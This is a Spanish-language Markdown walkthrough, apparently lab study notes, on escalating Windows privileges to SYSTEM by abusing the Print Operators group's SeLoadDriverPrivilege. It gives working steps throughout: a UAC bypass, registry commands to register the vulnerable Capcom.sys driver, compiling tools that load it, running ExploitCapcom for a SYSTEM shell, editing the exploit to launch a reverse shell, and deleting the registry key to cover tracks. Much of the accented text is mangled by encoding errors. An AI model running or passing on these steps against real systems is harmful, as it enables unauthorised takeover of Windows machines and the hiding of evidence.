# üîê Windows Privilege Escalation - Print Operators

## üßë‚Äçüíª ¬øQu√© es el grupo Print Operators?

**Print Operators** es un grupo privilegiado en sistemas Windows, especialmente en entornos de dominio. Sus miembros tienen acceso a operaciones cr√≠ticas como:

- Administrar, crear, compartir y eliminar impresoras conectadas a un **Controlador de Dominio (DC)**
- Iniciar sesi√≥n localmente en un DC
- Apagar el sistema
- Poseen el privilegio **SeLoadDriverPrivilege**, que permite **cargar o descargar controladores (drivers) en el kernel**

Este √∫ltimo privilegio puede ser explotado para lograr una **escalada de privilegios a SYSTEM**, si conseguimos cargar un driver malicioso o vulnerable.

---

## üîé Verificaci√≥n de privilegios

Comando:

```cmd
whoami /priv
```

En una sesi√≥n **no elevada**, probablemente no ver√°s `SeLoadDriverPrivilege` en la lista. Esto se debe a que necesitas una **sesi√≥n elevada** (con token completo) para que aparezca.

---

## üîì Elevaci√≥n mediante bypass de UAC

Si no tienes acceso a una GUI para ejecutar un proceso como administrador, puedes utilizar una herramienta como **UACMe**, que permite evadir el control de cuentas de usuario (UAC) desde la l√≠nea de comandos.

üì¶ [UACMe en GitHub](https://github.com/hfiref0x/UACME)

Esto te permitir√° lanzar procesos elevados sin necesidad de interacci√≥n del usuario, obteniendo as√≠ un token completo con acceso a `SeLoadDriverPrivilege`.

---

## ‚öôÔ∏è Preparar el entorno: Referencia al driver

Descarga el driver vulnerable `Capcom.sys` y col√≥calo, por ejemplo, en `C:\Tools\Capcom.sys`.

A continuaci√≥n, creamos dos entradas de registro bajo `HKEY_CURRENT_USER` para registrar el driver con el sistema.

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

‚úÖ Esto emula la forma en que los drivers se registran normalmente en `HKLM\SYSTEM\CurrentControlSet\Services`, pero en este caso lo hacemos en HKCU para no requerir privilegios de administrador.

üìå El prefijo especial `\??\` representa una **NT Object Path**. El API de Win32 lo traducir√° internamente al path real (`C:\Tools\Capcom.sys`) al cargar el driver.

---

## üìÑ Verificar que el driver no est√° cargado

Utiliza **DriverView** de NirSoft para listar todos los controladores cargados actualmente en el sistema.

üì¶ [DriverView ‚Äì NirSoft](https://www.nirsoft.net/utils/driverview.html)

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -Pattern Capcom
```

---

## üõ†Ô∏è Compilar y ejecutar EnableSeLoadDriverPrivilege

Este programa habilita el privilegio `SeLoadDriverPrivilege` en el token del proceso y ejecuta la funci√≥n `NtLoadDriver()` para cargar el driver referenciado en el registro.

### üì• C√≥digo fuente

üìÑ [EnableSeLoadDriverPrivilege.cpp (GitHub)](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)

A√±ade las importaciones arriba del todo del script: 
````c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
````

### ‚öôÔ∏è Compilaci√≥n

Abre un s√≠mbolo del sistema de **Visual Studio 2019 Developer Command Prompt** y ejecuta:

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Esto generar√° `EnableSeLoadDriverPrivilege.exe`.

### ‚ñ∂Ô∏è Ejecuci√≥n

```cmd
EnableSeLoadDriverPrivilege.exe
```

‚úÖ Si todo va bien, ver√°s el privilegio `SeLoadDriverPrivilege` como **Enabled** y una llamada exitosa a `NtLoadDriver`.

Ejemplo de salida esperada:

```
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeLoadDriverPrivilege        Enabled
...
NTSTATUS: 00000000, WinError: 0
```

---

## ‚úÖ Verificar que el driver ha sido cargado

Repite el escaneo con DriverView para asegurarte de que `Capcom.sys` est√° cargado:

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -Pattern Capcom
```

---

## üí£ Ejecutar exploit con Capcom.sys

Ahora que el driver est√° cargado, podemos explotarlo para ejecutar c√≥digo con privilegios SYSTEM. Podemos usar la herramienta de ExploitCapcom despu√©s de compilarla con VisualStudio.

üì¶ [ExploitCapcom en GitHub](https://github.com/tandasat/ExploitCapcom)

```cmd
ExploitCapcom.exe
```

Salida esperada:

```
[*] Capcom.sys exploit
[*] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

‚úÖ Tendr√°s una shell como **NT AUTHORITY\SYSTEM**

---

## üß± Alternativa sin GUI: Reverse Shell

Si no tienes acceso a un entorno gr√°fico o prefieres obtener una shell remota, edita `ExploitCapcom.cpp` y reemplaza la l√≠nea 292:

```cpp
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

por:

```cpp
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Compila el binario y escucha con netcat (o similar) desde tu m√°quina atacante. Tambi√©n puedes usar un bind shell o payload que agregue un usuario.

---

## ü§ñ Automatizaci√≥n con EoPLoadDriver

Podemos usar una herramienta como **EoPLoadDriver** para automatizar el proceso completo:

- Habilita el privilegio
- Crea la clave de registro
- Ejecuta `NtLoadDriver`

üì¶ [EoPLoadDriver en GitHub](https://github.com/TarlogicSecurity/EoPLoadDriver/)

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

Salida esperada:

```
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-...-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

Despu√©s, ejecuta `ExploitCapcom.exe` como antes.

---

## üßπ Limpieza

Para cubrir rastros, elimina la clave de registro que creaste:

```cmd
reg delete HKCU\System\CurrentControlSet\CAPCOM
```

Confirma con **Yes** cuando se te pregunte.

---

## ‚ö†Ô∏è Limitaciones

A partir de **Windows 10 versi√≥n 1803**, **ya no es posible cargar drivers desde HKEY_CURRENT_USER**, lo cual **invalida esta t√©cnica en versiones modernas**.

---
